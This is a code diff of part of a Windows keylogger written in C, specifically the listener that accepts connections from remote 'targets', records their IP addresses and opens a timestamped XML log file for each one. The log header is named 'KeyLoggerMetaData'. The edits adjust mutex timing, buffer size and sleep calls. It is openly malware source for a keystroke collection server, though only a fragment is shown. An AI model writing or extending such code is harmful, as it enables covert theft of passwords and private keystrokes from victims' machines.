@@ -45,7 +45,6 @@ void Listener()
 
     listen(Listener,3);
     cL=sizeof(target);
-    SOCKETLIST link;
     while(true)
     {
         fprintf(stderr, "accepted\n\t\t[*]Listening: ");
@@ -61,9 +60,9 @@ void Listener()
 
             fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
-
+            WaitForSingleObject(mu,INFINITE);
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
-            link->name = (char*)malloc(0xf0);
+            link->name = (char*)malloc(0x100);
             link->target = acceptedTarget;
             /*
                 if a file from the same ip is created at the same time then the naming convention
@@ -71,23 +70,18 @@ void Listener()
             */
             do
             {
-                Sleep(1);
                 GetSystemTime(&timestamp);
-                Sleep(1);
                 sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
-                Sleep(1);
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                                FILE_ATTRIBUTE_NORMAL,NULL);
-                Sleep(1);
             }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
-
             SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
              WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                 strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
-            WaitForSingleObject(mu,INFINITE);
+
             /*
                 establish a self referential linked list,
                     A->B->C->A...
